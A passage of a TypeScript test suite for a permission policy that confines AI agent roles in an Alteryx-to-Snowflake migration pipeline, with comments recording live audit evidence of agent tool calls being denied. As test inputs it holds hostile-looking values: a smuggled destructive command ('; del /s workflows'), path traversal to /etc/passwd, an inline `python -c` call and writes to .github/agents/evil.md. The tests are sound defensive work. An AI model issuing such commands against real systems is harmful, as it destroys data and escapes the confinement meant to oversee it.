  // "-file", meaning `powershell -File <script>.ps1`) BEFORE it ever dispatches to the
  // listing-command shape check. Every `-File`/`-file` token anywhere in a PowerShell command line
  // is denied unconditionally as "interpreter flag -file is never allowed", so get-childitem's own
  // declared "-file" allowance is unreachable dead configuration — a real internal inconsistency
  // found only by running a live session, not a security hole (denying is still safe either way).
  // Recorded, not fixed, per the addendum's rule against loosening a deny; see task-16-report.md.
  deny(decide("intake", "wf_0001", "powershell", { command: "Get-ChildItem -Path workflows -Recurse -File" }), /interpreter flag -File is never allowed/);
});

test("Task 16 live evidence: a hallucinated absolute path that only resembles the real root is denied", () => {
  // Real audit line: the model guessed `C:\Users\someone\Desktop\Alteryx-to-Snowflake\...`
  // (hyphenated) instead of the session's real working directory (which has spaces, per the
  // brief's repo path). normalizeToolPath correctly refuses it as outside the repository — the
  // fail-closed path rule caught a hallucinated path on the very first live tool call.
  deny(
    decide("intake", "wf_0001", "view", { path: "C:\\Users\\someone\\Desktop\\Alteryx-to-Snowflake\\workflows\\wf_0001\\manifest.json" }, undefined, ROOT),
    /outside the repository/,
  );
});

test("Task 16 live evidence: the exact repository root (no trailing segment) is denied for view/glob (known limitation, not fixed)", () => {
  // Real audit lines: `view` and `glob` on the scratch root's own absolute path, with no
  // trailing "/<something>", were both denied ("path outside the repository"). normalizeToolPath
  // requires normalizedPath.startsWith(root + "/"); the root alone never satisfies that. Denying
  // the root itself has no security cost (it can only make some legitimate root-level listing
  // calls fail, never widen access), so per the addendum this is recorded, not loosened.
  deny(decide("intake", "wf_0001", "view", { path: ROOT }, undefined, ROOT), /outside the repository/);
  deny(decide("intake", "wf_0001", "glob", { pattern: "**/*", paths: ROOT }, undefined, ROOT), /outside the repository/);
});

// --- F16 (ruling): agents are told to run Python as .venv/Scripts/python.exe (Windows) or
// .venv/bin/python (Unix), never bare `python` -- both spellings, forward AND back slash, must
// be allowed for each role's own scripts; bare `python scripts/…` stays allowed too (harmless,
// the documented form until now). Everything already denied (other interpreters, -c, -m unless
// already allowed, path traversal, shell metacharacters) must still be denied. -----------------

test("F16: the venv Python's two documented spellings are allowed for each role's own script, forward or back slash", () => {
  allow(decide("translator", "wf_0001", "powershell", { command: ".venv/Scripts/python.exe scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("translator", "wf_0001", "powershell", { command: ".venv\\Scripts\\python.exe scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("fixer", "wf_0001", "bash", { command: ".venv/bin/python scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("validator", "wf_0001", "bash", { command: ".venv/Scripts/python.exe scripts/validate_segment.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("validator", "wf_0001", "powershell", { command: ".venv\\Scripts\\python.exe scripts/compare.py --expected a --actual b" }));
  allow(decide("intake", "wf_0001", "powershell", { command: ".venv\\Scripts\\python.exe scripts/intake_touchpoints.py wf_0001" }));
  allow(decide("analyzer", "wf_0001", "bash", { command: ".venv/bin/python scripts/segment.py wf_0001" }));
  allow(decide("parser-recovery", "wf_0005", "powershell", { command: ".venv\\Scripts\\python.exe scripts/parse.py wf_0005 --check" }));
  allow(decide("parser-recovery", "wf_0005", "powershell", { command: ".venv\\Scripts\\python.exe -m pytest tests/parser_corpus -q" }));
});

test("F16: bare 'python' stays allowed too — the ruling keeps it, since it was the documented form and is harmless", () => {
  allow(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_01" }, "seg_01"));
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_segment.py wf_0001 seg_01" }, "seg_01"));
});

test("F16: the new spellings still deny everything the old one did", () => {
  // wrong role for the script
  deny(decide("translator", "wf_0001", "powershell", { command: ".venv\\Scripts\\python.exe scripts/validate_segment.py wf_0001 seg_01" }, "seg_01"), /translator/);
  // a different interpreter's path is not one of the two documented spellings
  deny(decide("translator", "wf_0001", "powershell", { command: "C:/Python312/python.exe scripts/compile_check.py wf_0001 seg_01" }, "seg_01"), /may not run/);
  deny(decide("translator", "wf_0001", "bash", { command: "/usr/bin/python3.11 scripts/compile_check.py wf_0001 seg_01" }, "seg_01"), /may not run/);
  // -c is never allowed, whichever spelling carries it
  deny(decide("translator", "wf_0001", "bash", { command: '.venv/bin/python -c "import os"' }, "seg_01"), /interpreter flag/);
  deny(decide("translator", "wf_0001", "powershell", { command: '.venv\\Scripts\\python.exe -c "import os"' }, "seg_01"), /interpreter flag/);
  // -m stays denied for a role that isn't parser-recovery, or a target that isn't the corpus
  deny(decide("analyzer", "wf_0001", "bash", { command: ".venv/bin/python -m pytest tests/parser_corpus" }), /may not run/);
  deny(decide("parser-recovery", "wf_0005", "powershell", { command: ".venv\\Scripts\\python.exe -m pytest tests/cookbook_examples" }), /may not run/);
  deny(decide("parser-recovery", "wf_0005", "powershell", { command: ".venv\\Scripts\\python.exe -m os" }), /may not run/);
  // path traversal in an argument is still denied
  deny(decide("translator", "wf_0001", "powershell", { command: ".venv\\Scripts\\python.exe scripts/compile_check.py ../../etc/passwd" }, "seg_01"), /argument|escapes/);
  // a shell metacharacter still ends the call
  deny(
    decide("translator", "wf_0001", "powershell", { command: '.venv\\Scripts\\python.exe scripts/compile_check.py wf_0001 seg_01; del /s workflows' }, "seg_01"),
    /metacharacter/,
  );
});

test("Task 16 live evidence: a real sub-agent (task) delegation call is allowed like any other read/planning tool", () => {
  // Real audit line: {"tool":"task","args":"{\"agent_type\":\"task\",\"description\":\"Inspect wf_0001 project structure\",\"name\":\"inspect-wf0001\",\"prompt\":\"...\"}","decision":"allow"}
  // "task" is already in READ_TOOLS; delegating to a sub-agent is not itself a filesystem/shell
  // action; whatever the sub-agent goes on to do is judged by the SAME onPreToolUse hook under the
  // same session (confirmed live: the sub-agent's own four chained shell commands were each denied
  // for shell metacharacters, exactly as if the top-level agent had sent them — see
  // task-16-report.md). No policy gap: a sub-agent cannot escape the permission policy.
  allow(
    decide("intake", "wf_0001", "task", {
      agent_type: "task",
      description: "Inspect wf_0001 project structure",
      name: "inspect-wf0001",
      prompt: "You are helping an Alteryx→Snowflake intake agent. Run these commands and show outputs...",
    }),
  );
});

test("live retest (larger-context) evidence: a genuinely unrecognized tool name is denied by default", () => {
  // Real audit line (2026-09-20, 65536-token context, q8_0/q8_0 KV cache):
  // {"tool":"list_powershell","args":"{}","decision":"deny"} followed by an "unrecognized-tool"
  // audit event. Matches none of SQL_TOOL/SHELL_TOOL/WRITE_TOOL/READ_TOOLS — the first
  // unrecognized-tool event ever observed live (Task 16's two attempts: zero). Fail-closed default
  // deny is exactly the intended behavior here; no policy change is called for.
  deny(decide("intake", "wf_0001", "list_powershell", {}), /unrecognized tool: list_powershell/);
});

test("live retest (larger-context) evidence: view's real view_range key is ignored by the path scanner", () => {
  // Real audit line: {"tool":"view","args":"{\"path\":\"scripts/intake_prompt.py\",\"view_range\":[398,720]}","decision":"allow"}
  // — the model paginates long files with view_range; that key does not match PATH_ARG_KEYS, so it
  // never reaches normalizeToolPath and cannot affect the decision either way.
  allow(decide("intake", "wf_0001", "view", { path: "scripts/intake_prompt.py", view_range: [398, 720] }));
});

test("live retest (larger-context) evidence: grep's real head_limit key is ignored by the path scanner", () => {
  // Real audit line: {"tool":"grep","args":"{\"pattern\":\"...\",\"paths\":\"...\",\"output_mode\":\"content\",\"-n\":true,\"head_limit\":80}","decision":"allow"}
  // — head_limit (a number) is not a path-bearing key either; documented here as the argument
  // shape actually sent, same reasoning as view_range above.
  allow(
    decide("intake", "wf_0001", "grep", {
      pattern: "def.*merge|confirmed_by|resolved",
      paths: "scripts/intake_prompt.py",
      output_mode: "content",
      "-n": true,
      head_limit: 80,
    }),
  );
});

// --- output targets, phase 1 (Task 6A): the three new scripts join the per-role allow-lists -----
// docs/superpowers/specs/2026-09-22-output-targets-design.md §6: target_check for the analyzer,
// render_snowpark for the translator/fixer, validate_snowpark for the validator; the reviewer
// runs none of them (it is read-only and never invokes a script).

test("each new target script is allowed for exactly the roles that run it", () => {
  allow(decide("analyzer", "wf_0001", "bash", { command: "python scripts/target_check.py wf_0001 --prefer auto" }));
  allow(decide("translator", "wf_0001", "bash", { command: "python scripts/render_snowpark.py wf_0001 seg_02" }, "seg_02"));
  allow(decide("fixer", "wf_0001", "bash", { command: "python scripts/render_snowpark.py wf_0001 seg_02" }, "seg_02"));
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_snowpark.py wf_0001 seg_02" }, "seg_02"));
  allow(decide("translator", "wf_0001", "bash", { command: "python scripts/compile_check.py wf_0001 seg_02 --target snowpark" }, "seg_02"));
});

test("the reviewer may run none of the target scripts, and neither may the wrong role", () => {
  for (const script of ["scripts/target_check.py", "scripts/render_snowpark.py", "scripts/validate_snowpark.py"]) {
    deny(decide("reviewer", "wf_0001", "bash", { command: `python ${script} wf_0001 seg_02` }, "seg_02"), /reviewer/);
  }
  deny(decide("analyzer", "wf_0001", "bash", { command: "python scripts/render_snowpark.py wf_0001 seg_02" }), /analyzer/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/target_check.py wf_0001" }, "seg_01"), /translator/);
  deny(decide("translator", "wf_0001", "bash", { command: "python scripts/validate_snowpark.py wf_0001 seg_01" }, "seg_01"), /translator/);
  deny(decide("validator", "wf_0001", "bash", { command: "python scripts/render_snowpark.py wf_0001 seg_01" }, "seg_01"), /validator/);
});

test("render_snowpark.py's output path is inside the lane of the roles allowed to run it", () => {
  // The renderer writes segments/<seg>/proc.sql; a role that may run it must also be allowed to
  // hold that file, or the write it causes would be a policy violation the moment an agent
  // touched the result. proc.py (its input) is in the same lane.
  for (const role of ["translator", "fixer"] as const) {
    allow(decide(role, "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_02/proc.sql" }, "seg_02"));
    allow(decide(role, "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_02/proc.py" }, "seg_02"));
    deny(decide(role, "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_03/proc.sql" }, "seg_02"), new RegExp(role));
  }
  deny(decide("reviewer", "wf_0001", "write", { path: "workflows/wf_0001/segments/seg_02/proc.py" }, "seg_02"), /reviewer/);
});

// --- output targets, phase 2 (Task D): the dbt lanes (DV5) and the dbt deny (DV6) ---------------
// A dbt workflow is one unit: its translator/fixer/reviewer/validator act on the whole project with
// no segment in context. The translator lane is the NARROWED subset of `dbt/**` — never the review
// that judges it, never the script's check report — and nobody runs dbt except the two scripts.

const DBT_SCOPE = { dbtProject: true };
const dbtWrite = (role: Parameters<typeof decide>[0], path: string) =>
  decide(role, "wf_0007", "create", { path }, undefined, ROOT, DBT_SCOPE);
const ALL_ROLES = ["intake", "analyzer", "translator", "reviewer", "validator", "fixer", "parser-recovery", "documenter"] as const;

test("the translator and fixer may write the dbt project files and models", () => {
  for (const role of ["translator", "fixer"] as const) {
    for (const file of [
      "dbt/models/region_attainment.sql",
      "dbt/models/sub/x.sql",
      "dbt/dbt_project.yml",
      "dbt/profiles.yml",
      "dbt/README.md",
      "dbt/translation_notes.md",
      "dbt/fix_log.md",
    ]) {
      allow(dbtWrite(role, `workflows/wf_0007/${file}`));
    }
  }
});

test("…but never the review, the check report, logs or a segment's procedure", () => {
  for (const role of ["translator", "fixer"] as const) {
    for (const file of [
      "dbt/review.json",
      "dbt/compile_check.json",
      "dbt/logs/validate_normal.log",
      "dbt/target/x.json",
      "segments/seg_01/proc.sql",
    ]) {
      deny(dbtWrite(role, `workflows/wf_0007/${file}`), new RegExp(role));
    }
    // traversal out of the models lane lands on a file the lane does not admit
    deny(dbtWrite(role, "workflows/wf_0007/dbt/models/../review.json"), new RegExp(role));
    deny(dbtWrite(role, "workflows/wf_0007/dbt/models/../../golden/outputs/normal/6.csv"), /golden/);
    deny(dbtWrite(role, "workflows/wf_0001/dbt/models/x.sql"), /other workflows/);
  }
});

// Final fix wave C1.8: the models lane is `dbt/models/**/*.sql` plus exactly the two YAML files —
// the same closed file set `compile_check.py --target dbt` and `run_dbt` enforce (dbt:surface).
test("the dbt models lane admits only SQL models and the two YAML files", () => {
  for (const role of ["translator", "fixer"] as const) {
    for (const file of [
      "dbt/models/sources.yml",
      "dbt/models/schema.yml",
      "dbt/models/wf0007_seg_01_out.sql",
      "dbt/models/sub/deeper/x.sql",
    ]) {
      allow(dbtWrite(role, `workflows/wf_0007/${file}`));
    }
    for (const file of [
      "dbt/models/x.py",
      "dbt/models/sub/x.py",
      "dbt/macros/x.sql",
      "dbt/packages.yml",
      "dbt/dependencies.yml",
      "dbt/selectors.yml",
      "dbt/models/extra.yml",
      "dbt/models/sub/schema.yml",
      "dbt/models/sources.yaml",
      "dbt/models/docs.md",
      "dbt/models/seed.csv",
      "dbt/snapshots/s.sql",
      "dbt/seeds/s.csv",
      "dbt/analyses/a.sql",
      "dbt/tests/t.sql",
      "dbt/dbt_packages/p/dbt_project.yml",
      "dbt/models/x.sql.py",
    ]) {
      deny(dbtWrite(role, `workflows/wf_0007/${file}`), new RegExp(role));
    }
  }
});

test("the reviewer in dbt scope writes only dbt/review.json", () => {
  allow(dbtWrite("reviewer", "workflows/wf_0007/dbt/review.json"));
  deny(dbtWrite("reviewer", "workflows/wf_0007/dbt/models/region_attainment.sql"), /reviewer/);
  deny(dbtWrite("reviewer", "workflows/wf_0007/dbt/compile_check.json"), /reviewer/);
  deny(dbtWrite("reviewer", "workflows/wf_0007/segments/seg_01/review.json"), /reviewer/);
});

test("the validator in dbt scope writes every segment's validation reports", () => {
  allow(dbtWrite("validator", "workflows/wf_0007/segments/seg_02/validation.normal.json"));
  allow(dbtWrite("validator", "workflows/wf_0007/segments/seg_01/validation.json"));
  deny(dbtWrite("validator", "workflows/wf_0007/dbt/models/x.sql"), /validator/);
  deny(dbtWrite("validator", "workflows/wf_0007/dbt/review.json"), /validator/);
  deny(dbtWrite("validator", "workflows/wf_0007/segments/seg_01/proc.sql"), /validator/);
});

test("without dbt scope and without a segment the translator may write nothing", () => {
  for (const role of ["translator", "fixer"] as const) {
    deny(decide(role, "wf_0007", "create", { path: "workflows/wf_0007/dbt/models/x.sql" }, undefined, ROOT), /no segment is in context/);
    deny(decide(role, "wf_0007", "create", { path: "workflows/wf_0007/dbt/dbt_project.yml" }, undefined, ROOT, {}), /no segment is in context/);
  }
  // …and with a segment but no dbt scope, the dbt project is outside the segment lane.
  deny(decide("translator", "wf_0007", "create", { path: "workflows/wf_0007/dbt/models/x.sql" }, "seg_01", ROOT), /translator/);
});

test("dbt scope changes no other role's lanes", () => {
  allow(dbtWrite("documenter", "workflows/wf_0007/docs/migration.md"));
  deny(dbtWrite("documenter", "workflows/wf_0007/dbt/models/x.sql"), /documenter/);
  allow(dbtWrite("analyzer", "workflows/wf_0007/segments/seg_01/contract.json"));
  deny(dbtWrite("analyzer", "workflows/wf_0007/dbt/dbt_project.yml"), /analyzer/);
  allow(dbtWrite("intake", "workflows/wf_0007/intake/mappings.yaml"));
});

test("the validator may run validate_dbt.py; the translator may run compile_check.py --target dbt", () => {
  const shell = (role: Parameters<typeof decide>[0], command: string) =>
    decide(role, "wf_0007", "bash", { command }, undefined, ROOT, DBT_SCOPE);
  allow(shell("validator", ".venv/Scripts/python.exe scripts/validate_dbt.py wf_0007"));
  allow(shell("validator", ".venv\\Scripts\\python.exe scripts/validate_dbt.py wf_0007 --set normal"));
  deny(shell("reviewer", ".venv/Scripts/python.exe scripts/validate_dbt.py wf_0007"), /reviewer/);
  for (const role of ["translator", "fixer"] as const) {
    allow(shell(role, ".venv/Scripts/python.exe scripts/compile_check.py wf_0007 --target dbt"));
    deny(shell(role, ".venv/Scripts/python.exe scripts/validate_dbt.py wf_0007"), new RegExp(role));
  }
  // a --project pointing outside the workflow is still judged like any other argument
  deny(shell("validator", ".venv/Scripts/python.exe scripts/validate_dbt.py wf_0007 --project ../../elsewhere"), /argument|escapes/);
});

test("no role may run dbt, however it is spelled", () => {
  const spellings = [
    "dbt run --project-dir workflows/wf_0007/dbt",
    ".venv/Scripts/dbt.exe parse",
    ".venv\\Scripts\\dbt run",
    "dbt.exe run",
    "DBT.EXE debug",
    "./dbt run",
    "/usr/local/bin/dbt run",
    "C:\\tools\\dbt.exe run --target snowflake",
    "python -m dbt.cli.main run",
    ".venv/Scripts/python.exe -m dbt run",
    "py -m dbt.cli.main parse",
  ];
  for (const role of ALL_ROLES) {
    for (const scope of [DBT_SCOPE, undefined]) {
      for (const command of spellings) {
        const d = decide(role, "wf_0007", "bash", { command }, undefined, ROOT, scope);
        deny(d, /dbt is run only by scripts\/compile_check\.py and scripts\/validate_dbt\.py/);
      }
    }
  }
});

// --- Task D fix round 1 (task-D-fix1.md): G1, G2, M2 --------------------------------------------

test("G1: a write call's content is never judged as a path", () => {
  // The probe: `file_text` matched PATH_ARG_KEYS' `file`, so the file's CONTENT was judged as a path.
  allow(dbtWrite("translator", "workflows/wf_0007/dbt/models/x.sql"));
  allow(decide("translator", "wf_0007", "create",
    { path: "workflows/wf_0007/dbt/models/x.sql", file_text: "select 1 as ID" }, undefined, ROOT, DBT_SCOPE));
  allow(decide("translator", "wf_0001", "create",
    { path: "workflows/wf_0001/segments/seg_01/proc.sql", file_text: "CREATE OR REPLACE PROCEDURE …" }, "seg_01", ROOT));
  // every content key, even one holding something path-shaped outside the lane
  for (const key of ["file_text", "content", "new_str", "old_str", "text", "old_string", "new_string"]) {
    allow(decide("fixer", "wf_0007", "str_replace",
      { path: "workflows/wf_0007/dbt/models/x.sql", [key]: ".github/agents/evil.md" }, undefined, ROOT, DBT_SCOPE));
  }
  allow(decide("fixer", "wf_0007", "edit",
    { path: "workflows/wf_0007/dbt/models/x.sql", insert_line: 3, new_str: "-- tool 4: Filter: workflows/wf_0007/dbt/review.json" }, undefined, ROOT, DBT_SCOPE));
});

test("G1: the real path is still judged, and so is any other path-like key", () => {
  // content naming a lane path cannot rescue a path that leaves the lane
  deny(decide("translator", "wf_0007", "create",
    { path: ".github/agents/evil.md", file_text: "workflows/wf_0007/dbt/models/x.sql" }, undefined, ROOT, DBT_SCOPE), /\.github/);
  deny(decide("translator", "wf_0007", "create",
    { path: "workflows/wf_0007/dbt/review.json", file_text: "{}" }, undefined, ROOT, DBT_SCOPE), /translator/);
  // a key that is not content stays scanned, known or not
  for (const key of ["target_file", "source_file", "file_path", "new_path", "destination", "output_dir"]) {
    deny(decide("translator", "wf_0007", "create",
      { path: "workflows/wf_0007/dbt/models/x.sql", file_text: "select 1", [key]: ".github/agents/evil.md" }, undefined, ROOT, DBT_SCOPE),
    /\.github/, );
  }
  // content keys are skipped as strings only: an object under one is still walked
  deny(decide("translator", "wf_0007", "apply_patch",
    { content: [{ path: ".github/agents/evil.md", new_str: "x" }] }, undefined, ROOT, DBT_SCOPE), /\.github/);
  // a mention of another workflow anywhere, content included, is still refused (rule 1a)
  deny(decide("translator", "wf_0007", "create",
    { path: "workflows/wf_0007/dbt/models/x.sql", file_text: "-- copied from workflows/wf_0002/dbt/models/x.sql" }, undefined, ROOT, DBT_SCOPE),
  /other workflows/);
});

/** Every allow-listed script whose first positional argument is the workflow id (argparse). */
const WORKFLOW_SCRIPTS: [Parameters<typeof decide>[0], string, string][] = [
  ["intake", "scripts/intake_touchpoints.py", ""],
  ["intake", "scripts/intake_prompt.py", " --no-interactive"],
  ["analyzer", "scripts/segment.py", ""],
  ["analyzer", "scripts/target_check.py", " --prefer auto"],
  ["translator", "scripts/compile_check.py", " seg_01"],
  ["fixer", "scripts/compile_check.py", " --target dbt"],
  ["translator", "scripts/render_snowpark.py", " seg_02"],
  ["validator", "scripts/validate_segment.py", " seg_01"],
  ["validator", "scripts/validate_snowpark.py", " seg_02"],
  ["validator", "scripts/validate_dbt.py", ""],
  ["parser-recovery", "scripts/parse.py", " --check"],
];

test("G2: a workflow script may only name the session's own workflow", () => {
  deny(decide("validator", "wf_0001", "bash", { command: ".venv/Scripts/python.exe scripts/validate_dbt.py wf_0002" }, undefined, ROOT, DBT_SCOPE),
    /^cross-workflow: scripts\/validate_dbt\.py wf_0002 in a wf_0001 session$/);
  for (const [role, script, rest] of WORKFLOW_SCRIPTS) {
    allow(decide(role, "wf_0001", "bash", { command: `.venv/Scripts/python.exe ${script} wf_0001${rest}` }, "seg_01", ROOT));
    deny(decide(role, "wf_0001", "bash", { command: `.venv/Scripts/python.exe ${script} wf_0002${rest}` }, "seg_01", ROOT),
      new RegExp(`^cross-workflow: ${script.replace(/\./g, "\\.")} wf_0002 in a wf_0001 session$`));
  }
  // the first BARE token is the one judged — a flag value before it is not skipped, so this is refused too
  deny(decide("fixer", "wf_0001", "bash", { command: "python scripts/compile_check.py --target dbt wf_0001" }, "seg_01", ROOT),
    /^cross-workflow: scripts\/compile_check\.py dbt in a wf_0001 session$/);
  // an id in another case is the same workflow (the ids are compared as the policy compares paths)
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_dbt.py WF_0001" }, undefined, ROOT));
  // no bare token at all: nothing to judge (the script prints its usage and touches no workflow)
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_dbt.py --help" }, undefined, ROOT));
  // …but a flag's value IS a bare token, so a call that leaves out the id is refused rather than guessed at
  deny(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_dbt.py --set normal" }, undefined, ROOT),
    /^cross-workflow: scripts\/validate_dbt\.py normal in a wf_0001 session$/);
});

test("G2: compare.py takes only flags and keeps working", () => {
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/compare.py --expected a --actual b" }));
  allow(decide("validator", "wf_0001", "bash", {
    command: ".venv/Scripts/python.exe scripts/compare.py --expected MIG_COMPARE.EXPECTED_0 --actual MIGDB.MIG_WORK.WF0001_SEG_01_OUT --contract workflows/wf_0001/segments/seg_01/contract.json --out workflows/wf_0001/segments/seg_01/validation.json",
  }, "seg_01", ROOT));
});

test("G2: the policy's workflow-script list is every allow-listed script whose argparse takes wf_id first", async () => {
  const { readFile } = await import("node:fs/promises");
  const { fileURLToPath } = await import("node:url");
  const { ROLE_SCRIPTS, WORKFLOW_ID_SCRIPTS } = await import("../policy.ts");
  const allowListed = [...new Set(Object.values(ROLE_SCRIPTS).flat())].sort();
  for (const script of allowListed) {
    const source = await readFile(fileURLToPath(new URL(`../../${script}`, import.meta.url)), "utf8");
    const first = /add_argument\(\s*"([^"]+)"/.exec(source)?.[1];
    assert.ok(first, `${script} declares an argument`);
    assert.equal(WORKFLOW_ID_SCRIPTS.includes(script), first === "wf_id", `${script}: first argument ${first}`);
  }
  assert.deepEqual([...WORKFLOW_ID_SCRIPTS].sort(), [...new Set(WORKFLOW_SCRIPTS.map(([, script]) => script))].sort());
});

// --- Task D fix round 2: an agent never gives a script --root ------------------------------------
// The orchestrator runs every agent session with the workflow root as its working directory, so no
// agent needs `--root`; given one, a script would read and write under another tree. Every spelling
// argparse accepts is refused: `--root X`, `--root=X`, `.` as the value, and the prefix
// abbreviations `--r`/`--ro`/`--roo` (no allow-listed script sets allow_abbrev=False, and none has
// another `--r…` flag, so argparse resolves each of them to `--root`).

test("script-root: --root in any spelling is denied in every agent's script call", () => {
  const spellings = ["--root .", "--root sub", "--root=sub", "--root=.", "--ROOT sub", "--roo sub", "--ro=x", "--r sub", "--root="];
  const calls: [Parameters<typeof decide>[0], string][] = [
    ["validator", "scripts/validate_dbt.py wf_0001"],
    ["translator", "scripts/compile_check.py wf_0001 seg_01"],
    ["fixer", "scripts/compile_check.py wf_0001 --target dbt"],
    ["analyzer", "scripts/target_check.py wf_0001 --prefer auto"],
    ["intake", "scripts/intake_prompt.py wf_0001 --no-interactive"],
    ["validator", "scripts/compare.py --expected a --actual b"],
  ];
  for (const [role, call] of calls) {
    const script = call.split(" ")[0];
    for (const spelling of spellings) {
      for (const command of [`.venv/Scripts/python.exe ${call} ${spelling}`, `python ${script} ${spelling} ${call.split(" ").slice(1).join(" ")}`]) {
        deny(decide(role, "wf_0001", "bash", { command }, "seg_01", ROOT, DBT_SCOPE),
          new RegExp(`^script-root: ${script.replace(/\./g, "\\.")} may not be given --root from an agent session$`));
      }
    }
  }
  // flags that merely start with the same letters are not --root
  allow(decide("validator", "wf_0001", "bash", { command: "python scripts/validate_segment.py wf_0001 seg_01 --set normal" }, "seg_01", ROOT));
});

test("M2: dbt.cmd and dbt.bat get the dbt denial too", () => {
  for (const command of ["dbt.cmd run", ".venv/Scripts/dbt.bat parse", "C:\\tools\\DBT.CMD debug"]) {
    deny(decide("translator", "wf_0007", "powershell", { command }, undefined, ROOT, DBT_SCOPE),
      /dbt is run only by scripts\/compile_check\.py and scripts\/validate_dbt\.py/);
  }
});

test("a file merely NAMED dbt is still readable, and a dbt-named workflow path is no executable", () => {
  allow(decide("reviewer", "wf_0007", "bash", { command: "cat workflows/wf_0007/dbt/models/region_attainment.sql" }, undefined, ROOT, DBT_SCOPE));
  allow(decide("reviewer", "wf_0007", "bash", { command: "ls workflows/wf_0007/dbt" }, undefined, ROOT, DBT_SCOPE));
  allow(decide("translator", "wf_0007", "view", { path: "workflows/wf_0007/dbt/dbt_project.yml" }, undefined, ROOT, DBT_SCOPE));
});

// ---------- output targets phase 2, Task W2: a batched analyzer's narrowed lane ----------
// Above a character budget the analyzer runs batch by batch; each call may write ONLY its own
// batch's contracts and its two fragment files. The lane is the policy's, never the prompt's: the
// analyzer in batch 2 cannot overwrite batch 1's contracts, write the stitched analysis.md (the
// script writes it), the manifest, or another workflow's files.

const BATCH_01 = { analyzerBatch: { id: "batch_01", segments: ["seg_01"] } };
const analyzerWrite = (path: string, options?: Parameters<typeof decide>[6], wf = "wf_0001") =>
  decide("analyzer", wf, "create", { path }, undefined, ROOT, options);

test("the analyzer in a batch writes only its batch's contracts and fragments", () => {
  for (const file of ["segments/seg_01/contract.json", "analysis/batch_01.md", "analysis/batch_01.unsupported.json"]) {
    allow(analyzerWrite(`workflows/wf_0001/${file}`, BATCH_01));
  }
  for (const file of [
    "segments/seg_02/contract.json",
    "analysis.md",
    "unsupported.json",
    "manifest.json",
    "analysis/batch_02.md",
    "analysis/batch_02.unsupported.json",
    "segments/seg_010/contract.json",
    "segments/seg_01/dag.json",
    "segments/seams.json",
    "segments/batches.json",
    "analysis/batch_01.md.bak",
  ]) {
    deny(analyzerWrite(`workflows/wf_0001/${file}`, BATCH_01), /analyzer may not write/);
  }
  // another workflow's files, whatever the lane would say about the path shape
  deny(analyzerWrite("workflows/wf_0002/analysis/batch_01.md", BATCH_01), /other workflows/);
  deny(analyzerWrite("workflows/wf_0002/segments/seg_01/contract.json", BATCH_01), /other workflows/);

  // Without a batch: today's lanes, unchanged.
  for (const file of ["segments/seg_01/contract.json", "segments/seg_02/contract.json", "analysis.md", "unsupported.json", "manifest.json"]) {
    allow(analyzerWrite(`workflows/wf_0001/${file}`));
  }
  deny(analyzerWrite("workflows/wf_0001/analysis/batch_01.md"), /analyzer may not write/);
});

test("a batch of several segments opens exactly those segments' contracts", () => {
  const batch = { analyzerBatch: { id: "batch_02", segments: ["seg_02", "SEG_03"] } };
  allow(analyzerWrite("workflows/wf_0001/segments/seg_02/contract.json", batch));
  allow(analyzerWrite("workflows/wf_0001/segments/seg_03/contract.json", batch));
  allow(analyzerWrite("workflows/wf_0001/analysis/batch_02.md", batch));
  deny(analyzerWrite("workflows/wf_0001/segments/seg_01/contract.json", batch), /analyzer may not write/);
  deny(analyzerWrite("workflows/wf_0001/analysis/batch_01.md", batch), /analyzer may not write/);
});

test("a batch id or segment id the policy cannot judge opens nothing (fail-closed)", () => {
  const odd = { analyzerBatch: { id: "batch_01|analysis", segments: ["seg_01|.*", "../seg_02"] } };
  for (const file of ["segments/seg_01/contract.json", "segments/seg_02/contract.json", "analysis/batch_01.md", "analysis.md"]) {
    deny(analyzerWrite(`workflows/wf_0001/${file}`, odd), /analyzer may not write/);
  }
});

test("the batch lane narrows the analyzer only: every other role keeps its own lanes", () => {
  allow(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/segments/seg_01/proc.sql" }, "seg_01", ROOT, BATCH_01));
  deny(decide("translator", "wf_0001", "edit", { path: "workflows/wf_0001/analysis/batch_01.md" }, "seg_01", ROOT, BATCH_01), /translator may not write/);
});

// ---------- follow-up to Task W2: no agent points a script at a real Snowflake account ----------
// Task P2 gives the validators `--backend snowflake`, `--connection NAME` and `--sandbox-database DB`.
// Like `--root`, none of them belongs in an agent's script call: every spelling argparse accepts is
// refused — `--flag x`, `--flag=x`, any case, and the unambiguous prefix abbreviations argparse
// resolves (`--back`, `--conn`, `--sand`, down to one letter). Denied for every script, whether or not
// that script has the flag yet: the policy must not depend on which task has landed.

test("script-backend: --backend, --connection and --sandbox-database are denied in every spelling", () => {
  const spellings = [
    "--backend snowflake", "--backend=snowflake", "--BACKEND snowflake", "--backe snowflake", "--back snowflake",
    "--ba=snowflake", "--b snowflake",
    "--connection prod", "--connection=prod", "--Connection prod", "--connect prod", "--conn prod", "--co=prod", "--c prod",
    "--sandbox-database MIGDB", "--sandbox-database=MIGDB", "--sandbox-data MIGDB", "--sandbox MIGDB", "--sand MIGDB",
    "--sa=MIGDB", "--s MIGDB",
  ];
  const calls: [Parameters<typeof decide>[0], string][] = [
    ["validator", "scripts/validate_segment.py wf_0001 seg_01"],
    ["validator", "scripts/validate_snowpark.py wf_0001 seg_01"],
    ["validator", "scripts/validate_dbt.py wf_0001"],
    ["validator", "scripts/compare.py --expected a --actual b"],
    ["translator", "scripts/compile_check.py wf_0001 seg_01"],
    ["fixer", "scripts/compile_check.py wf_0001 --target dbt"],
    ["analyzer", "scripts/target_check.py wf_0001 --prefer auto"],
  ];
  for (const [role, call] of calls) {
    const script = call.split(" ")[0];
